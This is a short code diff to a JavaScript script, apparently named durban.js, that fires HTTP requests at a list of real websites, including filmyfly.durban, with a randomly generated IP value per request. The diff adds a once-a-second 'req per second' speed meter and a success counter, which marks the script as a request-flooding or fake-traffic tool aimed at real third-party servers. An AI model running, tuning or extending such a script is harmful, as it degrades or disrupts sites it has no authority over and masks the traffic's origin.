@@ -11,6 +11,17 @@ function generateRandomNumber(length = 4) {
   return result;
 }
 
+let req = 0;
+let time = 0;
+
+const checkSpeed = () => {
+  time++;
+  const curSpeed = `${Math.round(req / time)} req per second`;
+  console.log("Cuurent speed: " + curSpeed);
+};
+
+setInterval(checkSpeed, 1000);
+
 const hitURL = async () => {
   try {
     const urls = [
@@ -22,7 +33,6 @@ const hitURL = async () => {
       `https://www.filmyfly.durban/`,
     ];
 
-    // for (let index = 0; index < 1000; index++) {
     urls.forEach(async (url) => {
       const _ip = ip();
       try {
@@ -39,20 +49,13 @@ const hitURL = async () => {
           },
         });
         console.log("success");
+        req++;
       } catch (err) {
-        // err.response &&
-        //   console.log(
-        //     "🚀 ~ file: durban.js:39 ~ urls.forEach ~ err:",
-        //     err.response
-        //   );
         console.log("fail");
       }
     });
-    // }
-
-    // console.log("Success");
   } catch (err) {
-    // console.log("🚀 ~ file: durban.js:5 ~ hitURL ~ err:", err);
+    console.log("🚀 ~ file: durban.js:5 ~ hitURL ~ err:", err);
     // console.log("Fail");
   }
 };
